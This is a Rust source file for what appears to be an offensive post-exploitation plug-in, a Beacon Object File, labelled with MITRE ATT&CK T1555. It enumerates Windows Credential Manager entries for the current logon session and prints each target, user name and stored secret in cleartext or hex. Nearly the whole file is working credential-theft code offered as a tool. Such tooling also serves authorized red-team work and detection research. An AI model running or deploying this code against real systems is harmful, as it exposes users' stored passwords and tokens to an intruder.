//! # Credential Manager BOF
//!
//! Enumerates credentials available to the current logon session through the
//! Windows Credential Manager API and prints bounded credential blobs.
//!
//! ## MITRE ATT&CK
//! - T1555 - Credentials from Password Stores
//!
//! ## Arguments
//! None.

#![no_std]

use alloc::{format, string::String};
use core::fmt::Write;
use rustbof::{eprintln, println};
use windows_sys::Win32::{
    Foundation::GetLastError,
    Security::Credentials::{CREDENTIALW, CredEnumerateW, CredFree},
};

const MAX_CREDENTIALS: u32 = 256;
const MAX_BLOB_BYTES: usize = 4096;

unsafe fn wide_string(pointer: *const u16) -> String {
    if pointer.is_null() {
        return String::from("<empty>");
    }

    let mut length = 0usize;
    while length < 32768 && unsafe { *pointer.add(length) } != 0 {
        length += 1;
    }
    if length == 32768 {
        return String::from("<invalid>");
    }

    String::from_utf16_lossy(unsafe { core::slice::from_raw_parts(pointer, length) })
}

fn blob_text(credential: &CREDENTIALW) -> String {
    let size = credential.CredentialBlobSize as usize;
    if size == 0 || credential.CredentialBlob.is_null() {
        return String::from("<empty>");
    }
    if size > MAX_BLOB_BYTES {
        return format!("<{} bytes; output limit exceeded>", size);
    }

    let bytes = unsafe { core::slice::from_raw_parts(credential.CredentialBlob, size) };
    if size % 2 == 0 {
        let units = bytes
            .chunks_exact(2)
            .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
            .collect::<alloc::vec::Vec<_>>();
        let length = units
            .iter()
            .position(|&unit| unit == 0)
            .unwrap_or(units.len());
        if length != 0
            && units[..length]
                .iter()
                .all(|unit| char::from_u32(*unit as u32).is_some_and(|value| !value.is_control()))
        {
            return String::from_utf16_lossy(&units[..length]);
        }
    }

    let mut output = String::with_capacity(size.saturating_mul(2));
    for byte in bytes {
        let _ = write!(&mut output, "{:02X}", byte);
    }
    output
}

#[rustbof::main]
fn main() {
    let mut count = 0u32;
    let mut credentials: *mut *mut CREDENTIALW = core::ptr::null_mut();
    let success = unsafe { CredEnumerateW(core::ptr::null(), 0, &mut count, &mut credentials) };
    if success == 0 {
        let error = unsafe { GetLastError() };
        if error == 1168 {
            println!("[*] Credential Manager returned no credentials.");
        } else {
            eprintln!("[-] CredEnumerateW failed: {}", error);
        }
        return;
    }

    let shown = count.min(MAX_CREDENTIALS);
    println!("Credential Manager entries: {}\n", count);
    for index in 0..shown as usize {
        let credential = unsafe { &**credentials.add(index) };
        println!("[{}] {}", index + 1, unsafe {
            wide_string(credential.TargetName)
        });
        println!("    user:    {}", unsafe {
            wide_string(credential.UserName)
        });
        println!("    type:    {}", credential.Type);
        println!("    persist: {}", credential.Persist);
        println!("    secret:  {}\n", blob_text(credential));
    }
    if count > shown {
        println!(
            "[*] Output limit reached; {} entries omitted.",
            count - shown
        );
    }

    unsafe { CredFree(credentials as *const core::ffi::c_void) };
}
